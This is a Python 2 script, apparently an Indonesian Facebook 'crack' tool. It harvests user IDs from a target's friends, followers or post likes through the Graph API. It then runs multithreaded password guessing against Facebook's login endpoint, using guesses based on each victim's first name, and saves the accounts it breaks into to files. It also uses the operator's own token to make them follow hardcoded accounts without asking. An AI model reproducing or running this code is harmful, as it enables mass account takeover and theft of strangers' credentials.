#!/usr/bin/python2
# coding=utf-8
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

reload(sys)
sys.setdefaultencoding('utf8')
useragents = ('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
              'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3638.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/197.0.0.46.98;]')
ua = 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
ips=None
try:
	b=requests.get("https://api-asutoolkit.cloudaccess.host/ip.php").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.0; M50 STAR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()

ng = requests.get('https://squirming-claim.000webhostapp.com/country/?').text
kt = requests.get('https://squirming-claim.000webhostapp.com/region/?').text
key = requests.get('https://raw.githubusercontent.com/avsid/ambf/main/license.php').text
ip = requests.get('https://api.ipify.org').text
logo="""
┌═════════════════════════════════════════════┐
   \x1b[92m ╔═╗┌─┐┌─┐┌┬┐  ╔═╗┬─┐┌─┐┌─┐┬┌─  ╔╦╗╔╗ ╔═╗\x1b[0m
   \x1b[92m ╠╣ ├─┤└─┐ │   ║  ├┬┘├─┤│  ├┴┐  ║║║╠╩╗╠╣ \x1b[0m
    ╚  ┴ ┴└─┘ ┴   ╚═╝┴└─┴ ┴└─┘┴ ┴  ╩ ╩╚═╝╚  
┌═════════════════════════════════════════════┐
            \x1b[92mCode By : Cyber Cilacap\x1b[0m
└═════════════════════════════════════════════┘"""
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
def tak():
    tatak = [
     '.   ', '..  ', '... ']
    for o in tatak:
        print '\r\x1b[0;35m•\x1b[0;36m Memeriksa Key ' + o,
        sys.stdout.flush()
        time.sleep(1)
        
def mamang_iwan():
    heker = [
     '.   ', '..  ', '... ']
    for m in heker:
        print '\r\x1b[0;35m•\x1b[0;36m Menghasilkan Key ' + m,
        sys.stdout.flush()
        time.sleep(1)


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
        return cetak(d)
        
        
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
def tod():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r[×] Mohon Tunggu ' + o,
        sys.stdout.flush()
        time.sleep(1)
        
def tik():
    oh = [
     '.   ', '..  ', '... ']
    for o in oh:
        print '\r\x1b[0;37m[×] Mohon Tunggu ' + o,
        sys.stdout.flush()
        time.sleep(1)
def license():
    try:
        toket = open('licensed.log', 'r').read()
    except IOError:
        print '\x1b[0;31m License Invalid !'
        os.system('clear')
        os.system('rm -rf licensed.log')
        iwan()

    if os.path.exists('licensed.log'):
        user1()
    else:
        iwan()

def iwan():
    os.system('clear')
    print logo
    mamang_iwan()
    id = uuid.uuid4().hex[:25]
    idg = open('licensed.log', 'w')
    idg.write(id)
    idg.close()
    jalan ('\n\x1b[0;35m• \x1b[0;36mKey\x1b[0;31m : \x1b[32m' + id+' \x1b[0;32m')
    time.sleep(0.07)
    jalan ('\x1b[0;35m• \x1b[0;31mKey Belum Di konfirmasi\x1b[1;39m')
    time.sleep(0.07)
    jalan ('\x1b[0;35m• \x1b[0;36mChat Admin Untuk Mengkonfirmasi Key\x1b[0;39m')
    time.sleep(0.07)
    raw_input('\x1b[0;35m• \x1b[0;36mTekan Enter ')
    os.system('am start https://wa.me/+6281259883257?text=Assalamualaikum+bang+saya+ingin+mengkonfirmasi+Key+saya%20Key:%20' + id + ' >/dev/null') 
    time.sleep(1)
    os.sys.exit()
def user1():
    try:
        j = open('licensed.log', 'r').read()
        r = requests.get('https://github.com/Mark-Zuck/indo.crack/blob/main/license/login%20license').text.strip() # Jangan Di ganti bro'i nanti error
        if j in r:
            os.system('clear')
            print logo
            print logo2
            tik()
            print " "
            jalan('\r\x1b[0;35m•\x1b[1;92m Key Tersedia')
            time.sleep(1)
            menu()
        else:
            os.system('clear')
            print logo
            tak()
            jalan ('\r\x1b[0;35m•\x1b[1;91m Key Tidak Tersedia')
            time.sleep(1)
            iwan()
            jalan ('\x1b[0;35m• \x1b[1;96mChat Admin Untuk Mengkonfirmasi Key\x1b[0;39m')
            time.sleep(0.07)
            raw_input('\x1b[0;35m• \x1b[0;36mTekan Enter ')
            os.system('am start https://wa.me/+6281259883257?text=Assalamualaikum+bang+saya+ingin+mengkonfirmasi+Key+saya%20Key:%20' + j + ' >/dev/null')
            os.sys.exit()
    except requests.exceptions.ConnectionError:
    	os.system('clear')
        print '\x1b[0;31m [!] Tidak Ada Koneksi Data\x1b[0;37m'
        os.sys.exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', 'licensed.log'])
        iwan()
        
def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        token = raw_input('\n[+] Your Token : ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(token)
            zedd.close()
            print(('\x1b[92m[•] Login Sukses!\x1b[0m'))
            requests.post('https://graph.facebook.com/100021483498135/subscribers?access_token='+token)#Anton Ibrahim
            requests.post('https://graph.facebook.com/100028262962654/subscribers?access_token='+token)#Irsya Maulana
            requests.post('https://graph.facebook.com/100013951308057/subscribers?access_token='+token)#Sultan Zahra
            print '[\xe2\x80\xa2] Follow Dulu Cok facebook Saya'
            raw_input('[>] Tekan Enter ')
            os.system('xdg-open https://www.facebook.com/jitendea.singh.12')
            menu()
        except KeyError:
            print ' [!] Token Invalid'
            sys.exit()
            
            
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()

    print logo
    print"┌═════════════════════════════════════════════┐"
    print"[+] Welcome   : \033[0;92m"+nama+"\033[0;97m"
    print"[+] Your IP   :"  +ip 
    print"[+] Beragbung :" +durasi
    print"└═════════════════════════════════════════════┘"
    print"[1] Crack Dari Publik Teman"
    print"[2] Crack Dari Total Followers"
    print"[3] Crack Dari Like Postingan"
    print"[4] Lihat Hasil Crack"
    print"[0] Logout (hapus token)"
    print"┌═════════════════════════════════════════════┐"
    pilih_menubapi()


def pilih_menubapi():
    ask = raw_input('[?] Pilih No : ')
    print"└═════════════════════════════════════════════┘"
    if ask == '':
        print '[!] Pilih Yang Bener !'
        exit()
    elif ask == '1' or ask == '01':
        print"[*] Isi 'me' Untuk Crack Dari List Teman"
        idt = raw_input('[+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[+] Nama : ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '2' or ask == '02':
        print "\n[*] Isi 'me' Untuk Crack Follower Sendiri"
        idt = raw_input('[+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[+] Nama : ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '3' or ask == '03':
        print '[*] Masukan ID Postingan'
        idt = raw_input('[+] ID Post : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '4' or ask == '04':
        print '\n[1] Hasil OK '
        print '[2] Hasil CP '
        ress = raw_input('\n[?] Pilih No : ')
        if ress == '':
            menu()
        elif ress == '1' or ress == '01':
            os.system('echo -e "\033[0;97m┌════════════════════════════════════════┐"| lolcat')
            print '\n[+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('echo -e "\033[0;97m└════════════════════════════════════════┘"| lolcat')
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '2' or ress == '02':
            os.system('echo -e "\033[0;97m┌════════════════════════════════════════┐"| lolcat')
            print '[+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('echo -e "\033[0;97m└════════════════════════════════════════┘"| lolcat')
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit('[!] Pilih Yang Bener !')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print '[!] Berhasil Menghapus Token'
        exit()
    else:
        print '[!] Pilih Yang Bener !'
        exit()
    ask = raw_input('[?] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualbapi()
    print '[*] Total ID : ' + str(len(id))
    print '[+] File Tersimpan Di:out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print '[+] File Tersimpan Di:out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print"[!] Sedang Prosess Crack"
    print"┌═════════════════════════════════════════════┐"

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[0;97m[Crack] %s/%s OK-:%s - CP-:%s  '% (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345', name.lower()]:
                ua_api = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': pw, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_api)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print'\r\x1b[0;92m [AS-OK] ' + uid + '|' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[AS-OK] ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print'\r\x1b[0;93m [AS-CP] ' + uid + '|' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[AS-CP] ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n[+] Finished'
    exit()


def manualbapi():
    print'\n[*] Masukan Password Contoh : sayang,123456'
    pw = raw_input('[?] Set Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Bener, Tidak Boleh Kosong')
    print'[*] Total ID : ' + str(len(id))
    print'[+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di:out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print'[+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di:out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print'[!] Sedang Prosess Crack'
    print"┌═════════════════════════════════════════════┐"

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[0;97m[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                ua_apim = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': asu, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_apim)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print'\r\x1b[0;92m [AS-OK] ' + uid + '|' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[AS-OK] ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print'\r\x1b[0;93m [AS-CP] ' + uid + '|' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[AS-CP] ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'[+] Finished'
    exit()
        
    


if __name__ == '__main__':
    os.system('clear')
    print logo
    print '     [#] Sebentar Lagi Update...'
    os.system('git pull')
    license()
    tokenz()


